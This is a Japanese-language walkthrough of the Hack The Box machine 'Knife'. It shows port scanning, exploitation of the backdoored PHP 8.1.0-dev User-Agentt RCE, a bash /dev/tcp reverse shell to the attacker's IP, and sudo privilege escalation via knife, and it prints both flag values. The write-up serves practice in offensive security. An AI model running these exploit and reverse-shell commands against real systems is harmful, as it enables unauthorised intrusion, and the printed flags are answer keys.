https://app.hackthebox.com/machines/Knife

## STEP 1
```sh
└─$ rustscan -a 10.129.207.242 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.207.242:22
Open 10.129.207.242:80
10.129.207.242 -> [22,80]
```


## STEP 2  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Knife_01.png">

curlでヘッダを確認、PHPのバージョンを確認できた
```sh
└─$ curl -I http://10.129.207.242 
HTTP/1.1 200 OK
Date: Wed, 25 Jun 2025 04:22:33 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```
今回のphpのバージョンは、RCEが動作するバックドアが仕込まれていたバージョンでありPoCも発見  
```sh
└─$ searchsploit -m 49933
  Exploit: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49933
     Path: /usr/share/exploitdb/exploits/php/webapps/49933.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/49933.py
```
PoCでRCE実行
```sh
└─$ python3.13 49933.py
Enter the full host url:
http://10.129.207.242/ 

Interactive shell is opened on http://10.129.207.242/ 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ bash -c "bash -i >& /dev/tcp/10.10.16.7/4444 0>&1"
^CExiting...
```
リバースシェル取得、ユーザフラグゲット！
```sh
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.207.242] 51632
bash: cannot set terminal process group (911): Inappropriate ioctl for device
bash: no job control in this shell

james@knife:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

james@knife:/$ ^Z
zsh: suspended  nc -lnvp 4444

└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444
                               ^C

james@knife:/$ export SHELL=bash

james@knife:/$ export TERM=xterm-256color

james@knife:/$ stty rows 66 columns 236

james@knife:/$ id
uid=1000(james) gid=1000(james) groups=1000(james)

james@knife:/$ cat /home/james/user.txt
bba83508c99c3412f30c9113955ebe23
```


## STEP 3
`/usr/bin/knife`がパスワードなしでroot権限実行できる
```sh
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
[gtfobins](https://gtfobins.github.io/gtfobins/knife/)で権限昇格のコマンドを確認、ルートフラグゲット
```sh
james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
c5d240400c720f165d8b28ebcae5b6bd
```
